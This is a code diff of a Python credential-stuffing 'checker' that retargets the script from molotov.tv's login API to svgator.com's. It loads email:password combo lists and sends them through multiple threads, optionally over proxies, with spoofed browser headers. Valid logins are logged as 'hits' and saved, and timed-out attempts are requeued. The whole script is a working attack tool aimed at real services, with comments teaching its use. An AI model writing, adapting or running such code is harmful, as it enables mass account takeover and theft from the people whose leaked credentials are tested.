@@ -1,32 +1,36 @@
 from dna.setup import * #importing the DNA library that is going to help you to make checkers 
-import requests, threading, time
+from dna.threadingz import *
+import requests,os
 from colorama import Fore,Style
-from multiprocessing import *
 
+threadingz = Threadingz() #Importing DNA safe synchronized threading system
 dna = DNA() #here we initialize the setup from DNA's library
 
 class Checker:
-    """The checker class !
-
-    This is where all the fun begins.
-
-    Think this as a capsule, creating all your app.
-    """
-    def __init__(self,checker_name):
+    
+    def __init__(self,checker_name,proxychoice):
         """This is where you initialise your checker, needs the name of your checker so it transform it into ascii
 
         Args:
             checker_name (str): name of your checker
         """
+        self.checker_name = checker_name
+        
         dna.generate_title(f'{checker_name}') #printing you ascii TITLE
+        
         dna.load_combos() #loading the combo.txt for you
-
+        
+        if proxychoice == True: #if we wanna build our checker proxy based
+            
+            dna.load_proxylist() #loading our combolist
+        else:
+            pass #do i need to explain this word ?
+        
         self.hits = 0
         self.fails = 0
         self.errors = 0
         self.retries = 0
-
-        self.accounts = dna.accounts #gather the accounts from the setup that loaded the combo. It's from another class that's why you have to put the setup.accounts.
+        self.checked = 0
         
     def request(self,acc):
         """This is were you checker works. After seting everything 
@@ -34,44 +38,66 @@ class Checker:
         Args:
             acc (str): the account that the checker is going to send
         """
-        self.email,self.password = acc.split(':')
+        try:          
+            self.email,self.password = acc.split(':')
+            
+        except:
+            
+            print(Fore.LIGHTWHITE_EX+f'[*] Invalid Account')          
+            return
         
         self.headers = {
             
             'content-type': 'application/json',
-            'origin' : 'https://www.molotov.tv',
-            'referer': 'https://www.molotov.tv/',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
-            "x-molotov-agent": '{"app_build":1,"app_id":"customer_area","api_version":8,"type":"desktop","os":"windows","manufacturer":"","model":"","brand":"","serial":"","features_supported":["parental_control_v3","allow_recurly"]}',
-            "x-molotov-website": "customer_area"} 
+            'referer': 'https://app.svgator.com/auth/login/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
+            } 
             
-        self.data = {"email": f"{self.email}", "password": f"{self.password}", "grant_type": "password"}
+        self.data = {"email": f"{self.email}", "password": f"{self.password}"}
         try:
-            with requests.post(f'https://fapi.molotov.tv/v3.1/auth/login',headers=self.headers, json= self.data) as r:
+            with requests.post(f'https://app.svgator.com/api/svgator/auth/login',headers=self.headers, json= self.data,timeout=1) as r:
                 
-                if 'display_name' in r.text:
+                if 'customer_id' in r.text:
+                    
                     self.hits+=1
+                    self.checked += 1
+                  
+                    print(Fore.LIGHTGREEN_EX+f'[*] Hit >> {acc}'+ Style.RESET_ALL)
                     
-                    print(Fore.LIGHTGREEN_EX+f'[*] Hit >> {acc}'+ Style.RESET_ALL) 
+                    dna.output(acc)
                     
-                elif 'Vos identifiants sont incorrects. Veuillez réessayer.' in r.text:
+                elif 'Invalid username or password' in r.text:
+                    
                     self.fails+=1
-                    
-                    print(Fore.LIGHTRED_EX+f'[*] Fail >> {acc}'+ Style.RESET_ALL)
-                else:
-                    pass
-                    #print(r.text)
-        except requests.exceptions.ProxyError:
+                    self.checked += 1
+                                   
+        except requests.exceptions.ConnectTimeout: #if we get a timeout
+            
+            self.retries += 1
+            dna.queue.put(acc) #puttin back the account in queue for re-check, since it's a FIFO queue, it will be checked last.
+            
+        except: #if we gat any other error
+        
+            self.errors+=1
             pass
 
-if __name__== '__main__' :
-    print(Style.RESET_ALL+Fore.LIGHTCYAN_EX)
-    
-    c = Checker('bartaba')
-    
-    while dna.queue.qsize() > 0:
-        
-            c.request(dna.queue.get())
-            
+if __name__ == '__main__' :
+    os.system('cls')  #clearing the screen, change to "clear" if you're on linux    
+    c = Checker('svgcheck',False) #Creating our checker, Use True or False to chose between proxyless or proxy enabled checker
 
-    print(Fore.LIGHTMAGENTA_EX+'> Completed !'+ Style.RESET_ALL)
+    print('──────────────────────────────────\n')
+    num_threads= int(input(Fore.LIGHTBLUE_EX+'Threads ? >>> '+Style.RESET_ALL))
+    print('\n──────────────────────────────────\n')
+
+    while not dna.queue.empty():
+        
+        for i in range(num_threads): #for the numbers of thread users chose
+            
+            threadingz.system(1,c.request,dna.queue.get()) #we add one thread, working on the checker using the account from the queue
+
+        threadingz.t.join() #we join every thread
+        
+    dna.queue.join() #once the queue is empty 
+    
+    print('>> Completed') #checker is completed !
+
